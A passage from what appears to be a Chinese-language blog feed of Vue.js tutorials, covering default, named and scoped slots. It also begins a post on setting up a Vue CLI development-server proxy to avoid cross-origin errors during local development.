</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">slot</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>该组件的使用方式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">display-frame</span> <span class="na">title</span><span class="o">=</span><span class="s">&#34;用户信息&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">    在组件标签体中的内容，
</span></span></span><span class="line"><span class="cl"><span class="c">    会被插入到组件中使用了 &lt;slot&gt; 的位置
</span></span></span><span class="line"><span class="cl"><span class="c">   --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>姓名：{{ user.name }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>性别：{{ user.sex }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>年龄：{{ user.age }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">display-frame</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p>注：插槽在使用过程中，<code>&lt;slot&gt;</code>标签并不限制使用次数，意味着可以在模板中显示两个相同的插槽内容。并且，在使用标签内容插入模板时，标签内容并不需要像组件模板一样需要在外部有一个作为根的元素。</p>
</blockquote>
<hr>
<h1 id="具名插槽" data-numberify>具名插槽<a class="anchor ms-1" href="#具名插槽"></a></h1>
<p>具名插槽就是指给组件插槽位置指定一个名称。外部在使用组件标签时，可以通过插槽名称指定模板要插入到组件中的位置。</p>
<p>定义插槽名称使用的是<code>&lt;slot&gt;</code>标签的<code>name</code>属性：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;display-frame&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">slot</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;header&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>Header<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">slot</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">slot</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;main&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>Main<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">slot</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">slot</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;footer&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>Footer<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">slot</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>上方定义了3个插槽，分别是<code>header</code>、<code>main</code>和<code>footer</code>。使用方式有两种：</p>
<ul>
<li>
<p><code>slot</code>属性：</p>
<pre tabindex="0"><code>slot=&#34;slot-name&#34;
</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">display-frame</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h3</span> <span class="na">slot</span><span class="o">=</span><span class="s">&#34;header&#34;</span><span class="p">&gt;</span>{{ title }}<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">img</span> <span class="na">slot</span><span class="o">=</span><span class="s">&#34;main&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://blog.linner.asia/images/avatar.jpg&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ul</span> <span class="na">slot</span><span class="o">=</span><span class="s">&#34;main&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>姓名：{{ user.name }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>性别：{{ user.sex }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>年龄：{{ user.age }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">slot</span><span class="o">=</span><span class="s">&#34;footer&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://blog.linner.asia&#34;</span><span class="p">&gt;</span>博客主页<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://blog.linner.asia/about/&#34;</span><span class="p">&gt;</span>个人信息<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://blog.linner.asia/contact/&#34;</span><span class="p">&gt;</span>联系用户<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">display-frame</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>slot</code>属性可以作用在普通元素标签上，也可以作用在<code>&lt;template&gt;</code>上。并且同个插槽可以同时存放多个元素（模板），只需要定义多个具有相同的<code>slot</code>属性的元素，或者使用<code>&lt;template&gt;</code>将它们包裹起来即可。</p>
</li>
<li>
<p><code>v-slot</code>指令：</p>
<pre tabindex="0"><code>v-slot:slot-name
</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">display-frame</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">v-slot:header</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h3</span> <span class="na">slot</span><span class="o">=</span><span class="s">&#34;header&#34;</span><span class="p">&gt;</span>{{ title }}<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">v-slot:main</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://blog.linner.asia/images/avatar.jpg&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>姓名：{{ user.name }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>性别：{{ user.sex }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>年龄：{{ user.age }}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">v-slot:footer</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://blog.linner.asia&#34;</span><span class="p">&gt;</span>博客主页<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://blog.linner.asia/about/&#34;</span><span class="p">&gt;</span>个人信息<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://blog.linner.asia/contact/&#34;</span><span class="p">&gt;</span>联系用户<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">display-frame</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>v-slot</code>指令在使用时，只能在<code>&lt;template&gt;</code>上使用，不能在其它元素标签上使用。</p>
</li>
</ul>
<blockquote>
<p>默认插槽就是没有提供<code>name</code>的<code>&lt;slot&gt;</code>。没有提供<code>name</code>的<code>&lt;slot&gt;</code>出口会隐式地命名为<code>default</code>。</p>
</blockquote>
<hr>
<h1 id="渲染作用域" data-numberify>渲染作用域<a class="anchor ms-1" href="#渲染作用域"></a></h1>
<p><u>插槽内容可以访问到父组件的数据作用域</u>，因为插槽内容本身是在父组件模板中定义的。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>{{ message }}<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">display-frame</span><span class="p">&gt;</span>{{ message }}<span class="p">&lt;/</span><span class="nt">display-frame</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>两个标签中的<code>{{ message }}</code>插值表达式渲染的内容都是一样的。</p>
<p>需要注意的是，<u>插槽的内容无法访问子组件的数据</u>（无法直接访问）。因为Vue模板中的表达式只能访问其定义时所处的作用域，这和JavaScript的词法作用域规则是一致的。</p>
<p>也就是说，在哪个文件中定义的模板，其数据的作用域就在哪个文件，其表达式访问的也是该文件中的数据。</p>
<hr>
<h1 id="作用域插槽" data-numberify>作用域插槽<a class="anchor ms-1" href="#作用域插槽"></a></h1>
<p>作用域插槽可以让组件在定义插槽位置时，将组件中的一些数据，通过插槽<code>&lt;slot&gt;</code>，像<code>props</code>传递数据那样，将数据传递给父组件使用。</p>
<p>向父组件传递数据：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;user-info&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">slot</span> <span class="na">:username</span><span class="o">=</span><span class="s">&#34;name&#34;</span> <span class="na">:age</span><span class="o">=</span><span class="s">&#34;18&#34;</span> <span class="na">:sex</span><span class="o">=</span><span class="s">&#34;男&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;user-info&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;张三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">age</span><span class="o">:</span> <span class="mi">18</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;男&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>父组件接收数据，并为子组件定义插槽模板，有3种方式：</p>
<ul>
<li>
<p><code>scope</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">scope</span><span class="o">=</span><span class="s">&#34;userInfo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>姓名：{{userInfo.username}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>性别：{{userInfo.sex}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>年龄：{{userInfo.age}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><code>slot-scope</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">slot-scope</span><span class="o">=</span><span class="s">&#34;userInfo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">ol</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>姓名：{{userInfo.username}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>性别：{{userInfo.sex}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>年龄：{{userInfo.age}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">ol</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><code>v-slot</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">v-slot</span><span class="o">=</span><span class="s">&#34;userInfo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>姓名：{{userInfo.username}}<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>性别：{{userInfo.sex}}<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>年龄：{{userInfo.age}}<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>与前两种不同的是，<code>v-slot</code>可以指定插槽位置：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;user-info&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">slot</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;main&#34;</span> <span class="na">:username</span><span class="o">=</span><span class="s">&#34;name&#34;</span> <span class="na">:age</span><span class="o">=</span><span class="s">&#34;18&#34;</span> <span class="na">:sex</span><span class="o">=</span><span class="s">&#34;男&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">v-slot:main</span><span class="o">=</span><span class="s">&#34;userInfo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>姓名：{{userInfo.username}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>性别：{{userInfo.sex}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>年龄：{{userInfo.age}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p><code>scope</code>和<code>slot-scope</code>指定卡槽需要配合<code>slot</code>属性。</p>
</blockquote>
<p><code>v-slot</code>可以直接在组件标签上使用：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">user-info</span> <span class="na">v-slot</span><span class="o">=</span><span class="s">&#34;userInfo&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">ol</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>姓名：{{userInfo.username}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>性别：{{userInfo.sex}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>年龄：{{userInfo.age}}<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">ol</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
</ul>
<p>这3种使用方式都支持解构赋值：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">slot-scope</span><span class="o">=</span><span class="s">&#34;{username, sex, age}&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>姓名：{{username}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h4</span><span class="p">&gt;</span>性别：{{sex}}<span class="p">&lt;/</span><span class="nt">h4</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h4</span><span class="p">&gt;</span>年龄：{{age}}<span class="p">&lt;/</span><span class="nt">h4</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">user-info</span> <span class="na">v-slot</span><span class="o">=</span><span class="s">&#34;{username, sex, age}&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>姓名：{{username}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h4</span><span class="p">&gt;</span>性别：{{sex}}<span class="p">&lt;/</span><span class="nt">h4</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h4</span><span class="p">&gt;</span>年龄：{{age}}<span class="p">&lt;/</span><span class="nt">h4</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">template</span> <span class="na">scope</span><span class="o">=</span><span class="s">&#34;{username, sex, age}&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>姓名：{{username}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h4</span><span class="p">&gt;</span>性别：{{sex}}<span class="p">&lt;/</span><span class="nt">h4</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h4</span><span class="p">&gt;</span>年龄：{{age}}<span class="p">&lt;/</span><span class="nt">h4</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">user-info</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>适用于：数据在组件中定义，但根据数据生成的结构需要组件的使用者来决定。</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue CLI 服务代理</title>
      <link>/docs/vue/components/dev-server-poxy/</link>
      <pubDate>Thu, 21 Sep 2023 04:59:57 +0000</pubDate>
      
      <guid>/docs/vue/components/dev-server-poxy/</guid>
      <description><![CDATA[通常情况下，跨域问题是由服务端依靠CORS或JSONP等方法解决。为了在开发过程中不依靠后端解决跨域问题，可以使用一台与前端页面服务的Hos]]></description>
      <content:encoded><![CDATA[<p>通常情况下，跨域问题是由服务端依靠CORS或JSONP等方法解决。为了在开发过程中不依靠后端解决跨域问题，可以使用一台与前端页面服务的Host相同的代理服务器，将请求发送给这台代理服务器，然后再由代理服务器将请求转发给真实的服务器。</p>
<p>使用服务代理可绕开浏览器同源策略的限制。服务代理可以使用Nginx等应用创建，当然Vue CLI也支持创建代理。</p>
<p>Vue CLI代理需要在<code>vue.config.js</code>中进行配置。</p>
<blockquote>
<p>注：Vue CLI代理仅是在开发过程中使用的。</p>
</blockquote>
<hr>
<h1 id="简单代理" data-numberify>简单代理<a class="anchor ms-1" href="#简单代理"></a></h1>
<p>Vue CLI创建代理最简单的方式就是：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">devServer</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">proxy</span><span class="o">:</span> <span class="s1">&#39;http://localhost:4000&#39;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>配置完成后，重启前端页面服务，然后将原本请求的Host改为与页面服务相同的Host即可。例如本地页面服务为<code>http://localhost:8080</code>，要发送的Ajax请求为<code>http://localhost:4000/api/user</code>。那么将Ajax请求改为<code>http://localhost:8080/api/user</code>即可通过服务代理绕过浏览器的同源策略。</p>
<blockquote>
<p>由于页面的端口与服务代理的端口一致，所以在发送请求时，可以将<code>http://localhost:8080/api/user</code>直接简写为<code>/api/user</code>。</p>
</blockquote>
<p>这种配置方式的服务代理，首先会根据请求路径，在项目的<code>public</code>目录下寻找对应的资源：</p>
<ul>
<li>如果<code>public</code>目录中有请求所对应的资源，那么服务器就直接将该资源发送给浏览器；</li>
<li>如果<code>public</code>目录中没有请求所对应的资源，那么服务器就会将这次请求通过代理的方式完整地转发给<code>proxy</code>配置的服务器。</li>
</ul>
<p>例如<code>http://localhost:8080/api/user</code>：</p>
<ul>
<li>如果<code>public</code>目录中有<code>api</code>目录，并且<code>api</code>目录下一个名为<code>user</code>这个资源，那么服务器就直接将<code>user</code>这个资源发送给浏览器。</li>
<li>如果<code>public</code>目录中没有<code>api</code>目录或者有<code>api</code>目录但是<code>api</code>目录下没有名为<code>user</code>的资源，那么服务器就会认为该请求需要走代理。</li>
</ul>
<p>也就是说，当请求了前端不存在的资源时，请求就会被转发给被代理的服务器（优先匹配前端资源）。</p>
<p>这种配置方式的优缺点如下：</p>
<ul>
<li>优点：配置简单。</li>
<li>缺点：不能配置多个代理，不能灵活控制某些请求是否走代理。</li>
</ul>
<hr>
